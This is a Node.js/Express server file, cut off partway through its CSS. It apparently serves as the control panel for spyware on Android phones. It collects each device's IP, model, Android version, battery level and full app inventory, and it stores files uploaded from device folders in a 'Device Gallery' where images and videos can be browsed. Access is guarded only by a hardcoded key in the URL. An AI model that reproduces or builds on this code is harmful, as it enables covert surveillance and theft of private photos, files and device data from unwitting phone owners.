const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(express.json());

/* ================= CONFIG =================== */

const LOG_FILE = "logs.json";
const CONFIG_FILE = "config.json";

const UPLOAD_DIR = path.join(__dirname, "uploads");
const THUMB_DIR = path.join(__dirname, "thumbs");

if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR);
if (!fs.existsSync(THUMB_DIR)) fs.mkdirSync(THUMB_DIR);

/* ================= HELPERS ================= */
/* ================= SECURITY ================= */

const SECRET = "mysecret123";

function auth(req, res, next) {
  const key = req.query.key;

  if (key !== SECRET) {
    return res.status(403).json({ error: "Forbidden" });
  }

  next();
}

function getIP(req) {
  return (
    (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
    req.socket.remoteAddress ||
    "unknown"
  );
}

function loadConfig() {
  try {
    return JSON.parse(fs.readFileSync(CONFIG_FILE, "utf-8"));
  } catch {
    return { enabled: false };
  }
}

function isAllowed(req, type) {
  const cfg = loadConfig();
  const ip = getIP(req);
  const model = req.query.model || "";

  if (!cfg.enabled) return false;
  if (type === "track" && !cfg.send_device_info) return false;
  if (type === "upload" && !cfg.send_files) return false;
  if (cfg.blocked_ips?.includes(ip)) return false;
  if (cfg.blocked_models?.includes(model)) return false;

  return true;
}

function saveLog(data) {
  try {
    fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
  } catch {}
}

function parseBody(body) {
  const params = new URLSearchParams(body);
  const obj = {};
  for (const [key, value] of params.entries()) {
    obj[key] = value;
  }
  return obj;
}

function readLogs() {
  if (!fs.existsSync(LOG_FILE)) return [];

  return fs
    .readFileSync(LOG_FILE, "utf-8")
    .split("\n")
    .filter(Boolean)
    .map((line) => {
      try {
        return JSON.parse(line);
      } catch {
        return null;
      }
    })
    .filter(Boolean);
}

function writeLogs(entries) {
  try {
    const content = entries.map((entry) => JSON.stringify(entry)).join("\n");
    fs.writeFileSync(LOG_FILE, content ? `${content}\n` : "");
  } catch {}
}

function removeFileLogEntries(fileName) {
  const logs = readLogs();
  const nextLogs = logs.filter((entry) => !(entry.type === "file" && entry.file === fileName));
  writeLogs(nextLogs);
}

function escapeHtml(value) {
  return String(value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function slugify(value) {
  return (
    String(value || "unknown")
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, "-")
      .replace(/^-+|-+$/g, "") || "unknown"
  );
}

function createDeviceId(ip, brand, model) {
  return [ip || "unknown", brand || "unknown", model || "unknown"].join("|");
}

function createDeviceLabel(device) {
  const brandModel = [device.brand, device.model].filter(Boolean).join(" ");
  return brandModel || device.model || device.brand || device.ip || "Unknown Device";
}

function formatDate(dateValue) {
  if (!dateValue) return "-";
  const date = new Date(dateValue);
  if (Number.isNaN(date.getTime())) return "-";
  return date.toLocaleString("en-IN", {
    dateStyle: "medium",
    timeStyle: "short",
  });
}

function formatSize(bytes) {
  const num = Number(bytes);
  if (!Number.isFinite(num) || num < 1) return "-";
  const units = ["B", "KB", "MB", "GB"];
  let size = num;
  let unitIndex = 0;
  while (size >= 1024 && unitIndex < units.length - 1) {
    size /= 1024;
    unitIndex += 1;
  }
  return `${size.toFixed(size >= 10 || unitIndex === 0 ? 0 : 1)} ${units[unitIndex]}`;
}

function getFileType(fileName) {
  const ext = path.extname(fileName || "").toLowerCase();
  if ([".jpg", ".jpeg", ".png", ".gif", ".webp"].includes(ext)) return "image";
  if ([".mp4", ".webm", ".mov", ".mkv"].includes(ext)) return "video";
  if ([".mp3", ".wav", ".aac", ".m4a"].includes(ext)) return "audio";
  if ([".pdf"].includes(ext)) return "document";
  if ([".zip", ".rar", ".7z"].includes(ext)) return "archive";
  return "file";
}

function getFileIcon(type) {
  const icons = {
    image: "IMG",
    video: "VID",
    audio: "AUD",
    document: "DOC",
    archive: "ZIP",
    file: "FILE",
  };
  return icons[type] || "FILE";
}

function getLatestDeviceForIP(ip, logs) {
  const devices = logs
    .filter((entry) => entry.type === "device" && entry.ip === ip)
    .sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0));

  return devices[0] || null;
}

function buildGalleryData(logs) {
  const deviceMap = new Map();
  const files = logs.filter((entry) => entry.type === "file");
  const deviceLogs = logs.filter((entry) => entry.type === "device");

  deviceLogs.forEach((device) => {
    const deviceId = device.device_id || createDeviceId(device.ip, device.brand, device.model);
    if (!deviceMap.has(deviceId)) {
      deviceMap.set(deviceId, {
        id: deviceId,
        ip: device.ip || "unknown",
        brand: device.brand || "",
        model: device.model || "",
        android: device.android || "",
        battery: device.battery || "",
        lastSeen: device.time,
        label: createDeviceLabel(device),
        folders: new Map(),
        files: [],
      });
    } else {
      const current = deviceMap.get(deviceId);
      if (new Date(device.time || 0) > new Date(current.lastSeen || 0)) {
        current.lastSeen = device.time;
        current.battery = device.battery || current.battery;
        current.android = device.android || current.android;
      }
    }
  });

  files.forEach((file) => {
    const uploadedPath = path.join(UPLOAD_DIR, file.file || "");
    if (!file.file || !fs.existsSync(uploadedPath)) return;

    const inferred =
      file.device_id ||
      createDeviceId(file.ip, file.device_brand, file.device_model);

    let device = deviceMap.get(inferred);

    if (!device) {
      const recent = getLatestDeviceForIP(file.ip, logs);
      const recentId = recent
        ? recent.device_id || createDeviceId(recent.ip, recent.brand, recent.model)
        : null;
      if (recentId && deviceMap.has(recentId)) {
        device = deviceMap.get(recentId);
      }
    }

    if (!device) {
      const fallbackId = inferred || `unknown|${file.ip || "na"}|unknown`;
      device = {
        id: fallbackId,
        ip: file.ip || "unknown",
        brand: file.device_brand || "",
        model: file.device_model || "",
        android: "",
        battery: "",
        lastSeen: file.time,
        label: createDeviceLabel({
          ip: file.ip || "unknown",
          brand: file.device_brand || "",
          model: file.device_model || "",
        }),
        folders: new Map(),
        files: [],
      };
      deviceMap.set(fallbackId, device);
    }

    const folderKey = file.folder || "unknown";
    if (!device.folders.has(folderKey)) {
      device.folders.set(folderKey, []);
    }

    const item = {
      ...file,
      typeLabel: getFileType(file.original || file.file),
      icon: getFileIcon(getFileType(file.original || file.file)),
      fullUrl: `/uploads/${encodeURIComponent(file.file)}`,
      thumbUrl: `/thumbs/${encodeURIComponent(file.thumb || file.file)}`,
    };

    device.files.push(item);
    device.folders.get(folderKey).push(item);
    if (!device.lastSeen || new Date(file.time || 0) > new Date(device.lastSeen || 0)) {
      device.lastSeen = file.time;
    }
  });

  return Array.from(deviceMap.values())
    .map((device) => ({
      ...device,
      folders: Array.from(device.folders.entries())
        .map(([name, items]) => ({
          name,
          slug: slugify(`${device.id}-${name}`),
          items: items.sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0)),
        }))
        .sort((a, b) => a.name.localeCompare(b.name)),
      files: device.files.sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0)),
    }))
    .sort((a, b) => new Date(b.lastSeen || 0) - new Date(a.lastSeen || 0));
}

function getGallerySignature(devices) {
  const latestStamp = devices.reduce((latest, device) => {
    const deviceLatest = device.files.reduce((maxTime, file) => {
      const stamp = new Date(file.time || 0).getTime();
      return Math.max(maxTime, Number.isNaN(stamp) ? 0 : stamp);
    }, 0);
    return Math.max(latest, deviceLatest);
  }, 0);

  return `${devices.length}:${devices.reduce((sum, d) => sum + d.files.length, 0)}:${latestStamp}`;
}

function renderUsersPage(logs) {
  const devices = logs
    .filter((entry) => entry.type === "device")
    .sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0));
  const files = logs
    .filter((entry) => entry.type === "file")
    .sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0));

  const latestByDevice = new Map();
  devices.forEach((device) => {
    const id = device.device_id || createDeviceId(device.ip, device.brand, device.model);
    if (!latestByDevice.has(id)) {
      latestByDevice.set(id, {
        ...device,
        device_id: id,
        file_logs: [],
      });
    }
  });

  files.forEach((file) => {
    const inferred =
      file.device_id || createDeviceId(file.ip, file.device_brand, file.device_model);
    let target = latestByDevice.get(inferred);
    if (!target && file.ip) {
      const matched = Array.from(latestByDevice.values()).find((device) => device.ip === file.ip);
      if (matched) target = matched;
    }
    if (target) {
      target.file_logs.push(file);
    }
  });

  const deviceCards = Array.from(latestByDevice.values()).map((device) => {
    const apps = device.user_apps || device.apps || [];
    const system = device.system_apps || [];
    const recentFiles = device.file_logs.slice(0, 12);

    return `
      <section class="device-card">
        <div class="device-head">
          <div>
            <p class="label">Endpoint</p>
            <h2>${escapeHtml(createDeviceLabel(device))}</h2>
            <p class="muted">
              ${escapeHtml(device.ip || "unknown")} • Android ${escapeHtml(device.android || "-")} •
              Last seen ${escapeHtml(formatDate(device.time))}
            </p>
          </div>
          <div class="status-pill">ONLINE</div>
        </div>

        <div class="stats">
          <div class="stat"><strong>${escapeHtml(device.battery || "-")}%</strong><span>Battery</span></div>
          <div class="stat"><strong>${apps.length}</strong><span>User Apps</span></div>
          <div class="stat"><strong>${system.length}</strong><span>System Apps</span></div>
          <div class="stat"><strong>${device.file_logs.length}</strong><span>Files Logged</span></div>
        </div>

        <div class="grid-2">
          <div class="panel">
            <div class="panel-top">
              <h3>Device Details</h3>
            </div>
            <div class="kv">
              <span>Brand</span><strong>${escapeHtml(device.brand || "-")}</strong>
              <span>Model</span><strong>${escapeHtml(device.model || "-")}</strong>
              <span>IP</span><strong>${escapeHtml(device.ip || "-")}</strong>
              <span>Android</span><strong>${escapeHtml(device.android || "-")}</strong>
              <span>Total Apps</span><strong>${escapeHtml(device.app_count || apps.length + system.length)}</strong>
              <span>Tracked At</span><strong>${escapeHtml(formatDate(device.time))}</strong>
            </div>
          </div>

          <div class="panel">
            <div class="panel-top">
              <h3>Recent File Logs</h3>
            </div>
            ${
              recentFiles.length
                ? `<div class="log-list">
                    ${recentFiles
                      .map(
                        (file) => `
                        <div class="log-row">
                          <div>
                            <strong>${escapeHtml(file.original || file.file)}</strong>
                            <small>${escapeHtml(file.folder || "unknown folder")}</small>
                          </div>
                          <div class="log-meta">
                            <span>${escapeHtml(formatDate(file.time))}</span>
                            <span>${escapeHtml(formatSize(file.size))}</span>
                          </div>
                        </div>
                      `
                      )
                      .join("")}
                  </div>`
                : `<div class="empty-box">No file logs for this device yet.</div>`
            }
          </div>
        </div>

        <div class="grid-2">
          <div class="panel">
            <div class="panel-top">
              <h3>User Apps</h3>
              <span class="count-chip">${apps.length}</span>
            </div>
            ${
              apps.length
                ? `<div class="app-list">${apps
                    .map((appName) => `<span>${escapeHtml(appName)}</span>`)
                    .join("")}</div>`
                : `<div class="empty-box">No user apps captured.</div>`
            }
          </div>

          <div class="panel">
            <div class="panel-top">
              <h3>System Apps</h3>
              <span class="count-chip">${system.length}</span>
            </div>
            ${
              system.length
                ? `<div class="app-list">${system
                    .map((appName) => `<span>${escapeHtml(appName)}</span>`)
                    .join("")}</div>`
                : `<div class="empty-box">No system apps captured.</div>`
            }
          </div>
        </div>
      </section>
    `;
  });

  return `
  <!DOCTYPE html>
  <html>
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Device Console</title>
      <style>
        :root {
          --bg: #040705;
          --panel: #0a110d;
          --panel-2: #0d1711;
          --line: rgba(104, 255, 168, 0.16);
          --text: #e6fff0;
          --muted: #8baa95;
          --accent: #72ffb7;
          --accent-2: #1dd17d;
          --shadow: 0 24px 60px rgba(0, 0, 0, 0.45);
        }

        * { box-sizing: border-box; }
        body {
          margin: 0;
          font-family: "Segoe UI", sans-serif;
          color: var(--text);
          background:
            linear-gradient(180deg, rgba(114,255,183,0.05), transparent 22%),
            repeating-linear-gradient(
              0deg,
              rgba(255,255,255,0.02) 0,
              rgba(255,255,255,0.02) 1px,
              transparent 1px,
              transparent 28px
            ),
            #040705;
        }

        .wrap {
          max-width: 1500px;
          margin: 0 auto;
          padding: 24px;
        }

        .hero, .device-card, .panel {
          background: linear-gradient(180deg, rgba(14,22,17,0.95), rgba(8,13,10,0.95));
          border: 1px solid var(--line);
          box-shadow: var(--shadow);
        }

        .hero {
          border-radius: 24px;
          padding: 24px;
          margin-bottom: 22px;
        }

        .hero h1 {
          margin: 6px 0 8px;
          font-size: 34px;
          letter-spacing: 0.04em;
          text-transform: uppercase;
        }

        .label, .muted, .log-row small {
          color: var(--muted);
        }

        .overview {
          display: grid;
          grid-template-columns: repeat(4, minmax(0, 1fr));
          gap: 14px;
          margin-top: 18px;
        }

        .overview-card {
          padding: 16px;
          border-radius: 18px;
          background: var(--panel-2);
          border: 1px solid var(--line);
        }

        .overview-card strong {
          display: block;
          font-size: 28px;
          margin-bottom: 6px;
        }

        .device-card {
          border-radius: 24px;
          padding: 22px;
          margin-bottom: 22px;
        }

        .device-head, .panel-top, .log-row {
          display: flex;
          justify-content: space-between;
          gap: 16px;
          align-items: flex-start;
        }

        .device-head h2 {
          margin: 6px 0 8px;
          font-size: 30px;
        }

        .status-pill, .count-chip {
          padding: 8px 12px;
          border-radius: 999px;
          border: 1px solid rgba(114,255,183,0.28);
          color: var(--accent);
          background: rgba(114,255,183,0.08);
          font-size: 12px;
          letter-spacing: 0.08em;
          text-transform: uppercase;
          white-space: nowrap;
        }

        .stats, .grid-2 {
          display: grid;
          gap: 14px;
        }

        .stats {
          grid-template-columns: repeat(4, minmax(0, 1fr));
          margin: 18px 0;
        }

        .grid-2 {
          grid-template-columns: repeat(2, minmax(0, 1fr));
          margin-top: 14px;
        }

        .stat, .panel {
          padding: 16px;
          border-radius: 18px;
        }

        .stat strong {
          display: block;
          font-size: 24px;
          margin-bottom: 6px;
        }

        .kv {
          display: grid;
          grid-template-columns: 130px 1fr;
          gap: 10px 14px;
        }

        .kv span {
          color: var(--muted);
        }

        .log-list, .app-list {
          display: grid;
          gap: 10px;
          margin-top: 14px;
        }

        .log-row {
          padding: 12px 0;
          border-bottom: 1px solid rgba(114,255,183,0.08);
        }

        .log-meta {
          display: grid;
          gap: 6px;
          text-align: right;
          color: var(--muted);
        }

        .app-list {
          grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
        }

        .app-list span {
          padding: 10px 12px;
          border-radius: 12px;
          background: rgba(255,255,255,0.03);
          border: 1px solid rgba(114,255,183,0.09);
          overflow: hidden;
          text-overflow: ellipsis;
        }

        .empty-box {
          margin-top: 14px;
          padding: 18px;
          border-radius: 14px;
          color: var(--muted);
          border: 1px dashed rgba(114,255,183,0.16);
          background: rgba(255,255,255,0.02);
        }

        @media (max-width: 960px) {
          .overview, .stats, .grid-2 {
            grid-template-columns: 1fr 1fr;
          }
        }

        @media (max-width: 720px) {
          .overview, .stats, .grid-2, .app-list {
            grid-template-columns: 1fr;
          }

          .device-head, .panel-top, .log-row {
            flex-direction: column;
          }

          .log-meta {
            text-align: left;
          }

          .kv {
            grid-template-columns: 1fr;
          }
        }
      </style>
    </head>
    <body>
      <div class="wrap">
        <section class="hero">
          <p class="label">Monitoring Console</p>
          <h1>Device Intelligence Board</h1>
          <p class="muted">Tracked devices, full app inventory, and recent file movement logs.</p>
          <div class="overview">
            <div class="overview-card"><strong>${latestByDevice.size}</strong><span>Devices</span></div>
            <div class="overview-card"><strong>${files.length}</strong><span>File Logs</span></div>
            <div class="overview-card"><strong>${devices.length}</strong><span>Track Events</span></div>
            <div class="overview-card"><strong>${files.filter((file) => getFileType(file.original || file.file) === "video").length}</strong><span>Video Logs</span></div>
          </div>
        </section>
        ${deviceCards.join("") || '<div class="empty-box">No device data found.</div>'}
      </div>
    </body>
  </html>
  `;
}

function renderGalleryPage(devices) {
  const totalFolders = devices.reduce((sum, device) => sum + device.folders.length, 0);
  const totalImages = devices.reduce(
    (sum, device) => sum + device.files.filter((file) => file.typeLabel === "image").length,
    0
  );
  const totalVideos = devices.reduce(
    (sum, device) => sum + device.files.filter((file) => file.typeLabel === "video").length,
    0
  );
  const gallerySignature = getGallerySignature(devices);

  const sidebarDevices = devices
    .map(
      (device, index) => `
      <button class="nav-device ${index === 0 ? "active" : ""}" data-device="${escapeHtml(device.id)}">
        <span class="device-dot"></span>
        <span>
          <strong>${escapeHtml(device.label)}</strong>
          <small>${escapeHtml(device.ip)} • ${device.files.length} files</small>
        </span>
      </button>
    `
    )
    .join("");

  const panels = devices
    .map((device, index) => {
      const folderLinks = device.folders
        .map(
          (folder) => `
          <a href="#${folder.slug}" class="folder-link">
            <span>${escapeHtml(folder.name)}</span>
            <small>${folder.items.length}</small>
          </a>
        `
        )
        .join("");

      const folderSections = device.folders
        .map((folder) => {
          const cards = folder.items
            .map((file) => {
              const isImage = file.typeLabel === "image";
              const isVideo = file.typeLabel === "video";
              const preview = isImage
                ? `<img src="${file.thumbUrl}" alt="${escapeHtml(file.original)}" loading="lazy">`
                : isVideo
                ? `<video muted preload="metadata"><source src="${file.fullUrl}"></video>`
                : `<div class="file-icon">${escapeHtml(file.icon)}</div>`;

              return `
              <article class="file-card" data-file="${escapeHtml(
                file.file
              )}" data-type="${escapeHtml(
                file.typeLabel
              )}" data-search="${escapeHtml(
                `${device.label} ${folder.name} ${file.original} ${file.typeLabel}`
              )}">
                <button
                  class="file-preview-trigger"
                  data-name="${escapeHtml(file.original)}"
                  data-device="${escapeHtml(device.label)}"
                  data-folder="${escapeHtml(folder.name)}"
                  data-type="${escapeHtml(file.typeLabel)}"
                  data-time="${escapeHtml(formatDate(file.time))}"
                  data-size="${escapeHtml(formatSize(file.size))}"
                  data-url="${escapeHtml(file.fullUrl)}"
                  data-thumb="${escapeHtml(isImage ? file.fullUrl : file.thumbUrl)}"
                >
                  <div class="file-thumb">${preview}</div>
                  <div class="file-meta">
                    <strong>${escapeHtml(file.original)}</strong>
                    <span>${escapeHtml(file.typeLabel.toUpperCase())}</span>
                    <small>${escapeHtml(formatDate(file.time))}</small>
                  </div>
                </button>
                <div class="file-actions">
                  <a href="${file.fullUrl}" target="_blank" rel="noreferrer">Open</a>
                  <a href="${file.fullUrl}" download>Download</a>
                  <button
                    type="button"
                    class="delete-file-btn"
                    data-file="${escapeHtml(file.file)}"
                    data-thumb="${escapeHtml(file.thumb || "")}"
                    data-name="${escapeHtml(file.original || file.file)}"
                  >Delete</button>
                </div>
              </article>
            `;
            })
            .join("");

          const rows = folder.items
            .map(
              (file) => `
              <tr class="file-row" data-file="${escapeHtml(
                file.file
              )}" data-type="${escapeHtml(file.typeLabel)}" data-search="${escapeHtml(
                `${device.label} ${folder.name} ${file.original} ${file.typeLabel}`
              )}">
                <td>${escapeHtml(file.icon)}</td>
                <td>${escapeHtml(file.original)}</td>
                <td>${escapeHtml(file.typeLabel)}</td>
                <td>${escapeHtml(formatDate(file.time))}</td>
                <td>${escapeHtml(formatSize(file.size))}</td>
                <td class="table-actions">
                  <a href="${file.fullUrl}" target="_blank" rel="noreferrer">Open</a>
                  <a href="${file.fullUrl}" download>Download</a>
                  <button
                    type="button"
                    class="delete-file-btn"
                    data-file="${escapeHtml(file.file)}"
                    data-thumb="${escapeHtml(file.thumb || "")}"
                    data-name="${escapeHtml(file.original || file.file)}"
                  >Delete</button>
                </td>
              </tr>
            `
            )
            .join("");

          return `
          <section id="${folder.slug}" class="folder-section">
            <div class="folder-header">
              <div>
                <h3>${escapeHtml(folder.name)}</h3>
                <p>${folder.items.length} items</p>
              </div>
              <button class="load-more-btn" type="button">Load More</button>
            </div>

            <div class="file-grid">${cards}</div>

            <div class="file-table-wrap">
              <table class="file-table">
                <thead>
                  <tr>
                    <th>Kind</th>
                    <th>Name</th>
                    <th>Type</th>
                    <th>Modified</th>
                    <th>Size</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody>${rows}</tbody>
              </table>
            </div>
          </section>
        `;
        })
        .join("");

      return `
      <section class="device-panel ${index === 0 ? "active" : ""}" data-device-panel="${escapeHtml(
        device.id
      )}">
        <div class="panel-top">
          <div>
            <p class="eyebrow">Device Workspace</p>
            <h2>${escapeHtml(device.label)}</h2>
            <p class="device-details">
              IP ${escapeHtml(device.ip)} • Android ${escapeHtml(device.android || "-")} •
              Battery ${escapeHtml(device.battery || "-")} • Last seen ${escapeHtml(
        formatDate(device.lastSeen)
      )}
            </p>
          </div>
          <div class="device-stats">
            <div><strong class="device-file-count">${device.files.length}</strong><span>Files</span></div>
            <div><strong class="device-folder-count">${device.folders.length}</strong><span>Folders</span></div>
          </div>
        </div>

        <div class="panel-controls">
          <div class="folder-links">${folderLinks || '<span class="empty-inline">No folders</span>'}</div>
        </div>

        ${folderSections || '<div class="empty-state">No files received yet.</div>'}
      </section>
    `;
    })
    .join("");

  return `
  <!DOCTYPE html>
  <html>
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Device Gallery</title>
      <style>
        :root {
          --panel: rgba(7, 15, 12, 0.94);
          --panel-2: rgba(10, 24, 19, 0.96);
          --line: rgba(80, 129, 108, 0.26);
          --text: #e8fff2;
          --muted: #8ca99a;
          --accent: #6dffb1;
          --accent-2: #33d17a;
          --shadow: 0 20px 60px rgba(0, 0, 0, 0.42);
        }

        * {
          box-sizing: border-box;
        }

        html {
          scroll-behavior: smooth;
        }

        body {
          margin: 0;
          font-family: "Segoe UI", sans-serif;
          color: var(--text);
          background:
            linear-gradient(180deg, rgba(109, 255, 177, 0.04), transparent 18%),
            repeating-linear-gradient(
              0deg,
              rgba(255,255,255,0.018) 0,
              rgba(255,255,255,0.018) 1px,
              transparent 1px,
              transparent 26px
            ),
            linear-gradient(180deg, #030806 0%, #07110d 50%, #020504 100%);
          min-height: 100vh;
        }

        .app-shell {
          display: grid;
          grid-template-columns: 280px minmax(0, 1fr) 340px;
          min-height: 100vh;
        }

        .sidebar,
        .preview {
          background: var(--panel);
          backdrop-filter: blur(16px);
          border-right: 1px solid var(--line);
        }

        .preview {
          border-right: none;
          border-left: 1px solid var(--line);
          padding: 24px;
          position: sticky;
          top: 0;
          height: 100vh;
        }

        .sidebar {
          padding: 24px 18px;
          position: sticky;
          top: 0;
          height: 100vh;
          overflow: auto;
        }

        .main {
          padding: 24px;
        }

        .top-strip {
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 10px;
          margin-bottom: 16px;
          flex-wrap: wrap;
        }

        .live-pill,
        .sync-banner {
          display: inline-flex;
          align-items: center;
          gap: 10px;
          padding: 8px 12px;
          border-radius: 999px;
          border: 1px solid rgba(109, 255, 177, 0.22);
          background: rgba(109, 255, 177, 0.06);
          color: var(--muted);
          font-size: 13px;
          letter-spacing: 0.08em;
          text-transform: uppercase;
        }

        .live-dot {
          width: 8px;
          height: 8px;
          border-radius: 999px;
          background: var(--accent);
          box-shadow: 0 0 12px rgba(109, 255, 177, 0.55);
        }

        .sync-banner {
          display: none;
        }

        .sync-banner.show {
          display: inline-flex;
        }

        .sync-banner button {
          border: 1px solid rgba(109,255,177,0.24);
          background: rgba(109,255,177,0.08);
          color: var(--accent);
          border-radius: 999px;
          padding: 6px 10px;
          cursor: pointer;
          font: inherit;
        }

        .modal {
          position: fixed;
          inset: 0;
          display: none;
          align-items: center;
          justify-content: center;
          background: rgba(1, 6, 4, 0.7);
          backdrop-filter: blur(8px);
          z-index: 50;
          padding: 20px;
        }

        .modal.show {
          display: flex;
        }

        .modal-card {
          width: min(460px, 100%);
          border-radius: 22px;
          border: 1px solid rgba(109,255,177,0.24);
          background:
            linear-gradient(180deg, rgba(14,22,17,0.98), rgba(7,11,9,0.98));
          box-shadow: var(--shadow);
          overflow: hidden;
        }

        .modal-head,
        .modal-body,
        .modal-actions {
          padding: 18px 20px;
        }

        .modal-head {
          border-bottom: 1px solid var(--line);
        }

        .modal-head h3 {
          margin: 0 0 6px;
          text-transform: uppercase;
          letter-spacing: 0.05em;
        }

        .modal-body {
          color: var(--muted);
          line-height: 1.6;
        }

        .modal-file {
          margin-top: 12px;
          padding: 12px 14px;
          border-radius: 14px;
          border: 1px solid rgba(109,255,177,0.14);
          background: rgba(255,255,255,0.025);
          color: var(--text);
          word-break: break-word;
        }

        .modal-actions {
          display: flex;
          justify-content: flex-end;
          gap: 10px;
          border-top: 1px solid var(--line);
        }

        .modal-actions button {
          border-radius: 12px;
          padding: 10px 14px;
          font: inherit;
          cursor: pointer;
        }

        .modal-cancel {
          border: 1px solid var(--line);
          background: rgba(255,255,255,0.03);
          color: var(--muted);
        }

        .modal-delete {
          border: 1px solid rgba(255, 120, 120, 0.24);
          background: rgba(255, 120, 120, 0.08);
          color: #ff9090;
        }

        .brand {
          margin-bottom: 22px;
        }

        .brand h1 {
          margin: 0 0 8px;
          font-size: 24px;
          letter-spacing: 0.03em;
          text-transform: uppercase;
        }

        .brand p,
        .eyebrow,
        .device-details,
        .folder-header p,
        .file-meta span,
        .file-meta small,
        .nav-device small,
        .preview small,
        .empty-inline {
          color: var(--muted);
        }

        .stats-bar {
          display: grid;
          grid-template-columns: repeat(4, minmax(0, 1fr));
          gap: 16px;
          margin-bottom: 20px;
        }

        .stat-card {
          background: var(--panel);
          border: 1px solid var(--line);
          border-radius: 18px;
          padding: 18px;
          box-shadow: var(--shadow);
          transition: transform 0.18s ease, border-color 0.18s ease;
        }

        .stat-card:hover,
        .file-card:hover {
          transform: translateY(-2px);
          border-color: rgba(109, 255, 177, 0.24);
        }

        .stat-card strong {
          display: block;
          font-size: 28px;
          margin-bottom: 6px;
        }

        .toolbar {
          display: flex;
          gap: 12px;
          align-items: center;
          justify-content: space-between;
          margin-bottom: 24px;
          flex-wrap: wrap;
          background: var(--panel);
          border: 1px solid var(--line);
          border-radius: 18px;
          padding: 14px;
        }

        .toolbar input {
          min-width: 260px;
          background: rgba(255, 255, 255, 0.03);
          border: 1px solid var(--line);
          border-radius: 12px;
          color: var(--text);
          padding: 12px 14px;
          outline: none;
        }

        .toolbar input::placeholder {
          color: #769284;
        }

        .view-toggle,
        .type-toggle {
          display: flex;
          gap: 8px;
        }

        .view-toggle button,
        .type-toggle button,
        .load-more-btn,
        .nav-device,
        .file-preview-trigger {
          border: none;
          background: transparent;
          color: inherit;
          font: inherit;
          cursor: pointer;
        }

        .view-toggle button,
        .type-toggle button,
        .load-more-btn {
          padding: 10px 14px;
          border-radius: 12px;
          background: rgba(255, 255, 255, 0.03);
          border: 1px solid var(--line);
          color: var(--muted);
        }

        .view-toggle button.active,
        .type-toggle button.active {
          background: rgba(109, 255, 177, 0.1);
          border-color: rgba(109, 255, 177, 0.35);
          color: var(--accent);
        }

        .nav-device {
          width: 100%;
          text-align: left;
          display: flex;
          gap: 12px;
          align-items: flex-start;
          padding: 14px;
          border-radius: 16px;
          margin-bottom: 10px;
          background: rgba(255, 255, 255, 0.02);
          border: 1px solid transparent;
          transition: background 0.18s ease, border-color 0.18s ease, transform 0.18s ease;
        }

        .nav-device.active {
          background: rgba(109, 255, 177, 0.08);
          border-color: rgba(109, 255, 177, 0.28);
          transform: translateX(2px);
        }

        .device-dot {
          width: 10px;
          height: 10px;
          border-radius: 999px;
          margin-top: 6px;
          background: linear-gradient(180deg, var(--accent), var(--accent-2));
          box-shadow: 0 0 16px rgba(109, 255, 177, 0.36);
          flex: none;
        }

        .device-panel {
          display: none;
        }

        .device-panel.active {
          display: block;
        }

        .panel-top {
          display: flex;
          justify-content: space-between;
          gap: 24px;
          align-items: flex-start;
          margin-bottom: 20px;
        }

        .panel-top h2 {
          margin: 4px 0 8px;
          font-size: 34px;
          text-transform: uppercase;
        }

        .device-stats {
          display: grid;
          grid-template-columns: repeat(2, minmax(0, 1fr));
          gap: 12px;
          min-width: 170px;
        }

        .device-stats div {
          background: var(--panel-2);
          border: 1px solid var(--line);
          border-radius: 16px;
          padding: 14px;
        }

        .device-stats strong {
          display: block;
          font-size: 22px;
        }

        .panel-controls {
          margin-bottom: 20px;
        }

        .folder-links {
          display: flex;
          flex-wrap: wrap;
          gap: 10px;
        }

        .folder-link {
          display: inline-flex;
          gap: 10px;
          align-items: center;
          padding: 10px 14px;
          text-decoration: none;
          color: var(--text);
          background: rgba(255, 255, 255, 0.03);
          border: 1px solid var(--line);
          border-radius: 999px;
        }

        .folder-link::before {
          content: ">_";
          color: var(--accent);
          letter-spacing: 0.08em;
        }

        .folder-section {
          margin-bottom: 28px;
          background: rgba(5, 11, 9, 0.72);
          border: 1px solid var(--line);
          border-radius: 22px;
          padding: 18px;
          box-shadow: var(--shadow);
        }

        .folder-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 16px;
          gap: 12px;
        }

        .folder-header h3 {
          margin: 0 0 4px;
          font-size: 22px;
          text-transform: uppercase;
        }

        .file-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
          gap: 16px;
        }

        .file-card {
          background: rgba(255, 255, 255, 0.025);
          border: 1px solid var(--line);
          border-radius: 18px;
          overflow: hidden;
          display: flex;
          flex-direction: column;
          transition: transform 0.2s ease, border-color 0.2s ease;
        }

        .file-preview-trigger {
          padding: 0;
          text-align: left;
        }

        .file-thumb {
          aspect-ratio: 4 / 3;
          background:
            linear-gradient(180deg, rgba(114,255,183,0.04), transparent),
            repeating-linear-gradient(
              0deg,
              rgba(255,255,255,0.025) 0,
              rgba(255,255,255,0.025) 1px,
              transparent 1px,
              transparent 22px
            ),
            linear-gradient(135deg, rgba(20, 50, 36, 0.8), rgba(12, 30, 22, 0.95));
          display: flex;
          align-items: center;
          justify-content: center;
          overflow: hidden;
        }

        .file-thumb img,
        .file-thumb video {
          width: 100%;
          height: 100%;
          object-fit: cover;
          display: block;
        }

        .file-icon {
          width: 72px;
          height: 72px;
          border-radius: 18px;
          background: rgba(255, 255, 255, 0.06);
          display: grid;
          place-items: center;
          font-weight: 700;
          letter-spacing: 0.08em;
        }

        .file-meta {
          padding: 14px;
          display: grid;
          gap: 6px;
        }

        .file-actions,
        .table-actions {
          display: flex;
